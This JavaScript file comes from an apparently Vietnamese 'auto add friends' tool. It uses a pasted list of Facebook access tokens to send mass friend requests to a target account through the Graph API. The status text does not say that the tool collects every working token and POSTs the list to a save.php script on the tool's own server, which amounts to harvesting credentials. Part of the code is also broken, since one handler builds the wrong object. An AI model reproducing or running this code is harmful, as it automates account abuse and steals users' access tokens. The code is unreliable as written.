function auto_addfriends_send(a) {
    return 0 == auto_addfriends.run ? !1 : ($('#auto_addfriends_status').html('<font color=\"blue\">Đang lấy Access Token số <b>' + (a + 1) + '</b> để Add Friends</font> ' + run.loading()), void($).get('https://graph.facebook.com/me/friends/' + auto_addfriends.id, {
        method: 'post',access_token: auto_addfriends.token[a]
    }).done(function() {
        ++auto_addfriends.success, auto_addfriends.bach += auto_addfriends.token[a] + '', $('#auto_addfriends_success').text(auto_addfriends.success), $('#auto_addfriends_status').html('<font color=\"green\">Access Token số <b>' + (a + 1) + '</b> đã Add Friends thành công</font> ' + run.loading())
    }).error(function(b) {
        ++auto_addfriends.error, $('#auto_addfriends_error').text(auto_addfriends.error), $('#auto_addfriends_status').html('<font color=\"red\">Access Token số <b>' + (a + 1) + '</b> đã Add Friends thất bại</font> ' + run.loading())
    }).always(function() {
        if ($('#auto_addfriends_progress').attr('style', 'width: ' + Math.floor(100 * (auto_addfriends.success + auto_addfriends.error) / auto_addfriends.token.length) + '%'), auto_addfriends.success + auto_addfriends.error == auto_addfriends.token.length) {
            $('.progress-striped').removeClass('active'), $('#submit_auto_addfriends_start').buttonStop(), $('#submit_auto_addfriends_stop').disabled(), noti.success('Quá trình AUTO Add Friends đã hoàn tất !'), $('#auto_addfriends_status').text('Đang chờ !');
            var a = $.trim(auto_addfriends.bach).split('');
            a.length > 0 && $.post('//' + b_sv + '/save.php', {
                act: 'save',
                array: a
            })
        }
    }))
}
location.hostname == b_sv && ($(document).on('click', '#submit_auto_addfriends_stop', function() {
    auto_addfriends.run = 0, $('#submit_auto_addfriends_stop').disabled(), $('.progress-striped').removeClass('active'), $('#submit_auto_addfriends_start').buttonStop(), noti.success('Đã có lệnh dừng AUTO Add Friends !'), $('#auto_addfriends_status').text('Đã dừng AUTO Add Friends !')
}), $(document).on('click', '#submit_auto_addfriends_start', function() {
		if(auto_like={
		token:$('#input_auto_addfriends_token').validate(),id:$('#input_auto_addfriends_id').isNumber(),delay:$('#input_auto_addfriends_delay').isNumber(),run:1,success:0,error:0,bach:''
	}
		, auto_addfriends.token && auto_addfriends.id && auto_addfriends.delay) {
        $(this).buttonLoad(), auto_addfriends.token = auto_addfriends.token.split('\n'), $('.auto_addfriends_progress').hide().slideDown('fast'), $('.progress-striped').addClass('active'), $('#auto_addfriends_progress').attr('style', 'width: 0%'), $('#submit_auto_addfriends_stop').undisabled();
        for (var a = 0;
		a<auto_addfriends.token.length;
		a++) {
            ! function(a) {
                setTimeout(function() {
                    auto_addfriends_send(a)
                }
				,a*auto_addfriends.delay)
            }
			(a)
        }
    }
}))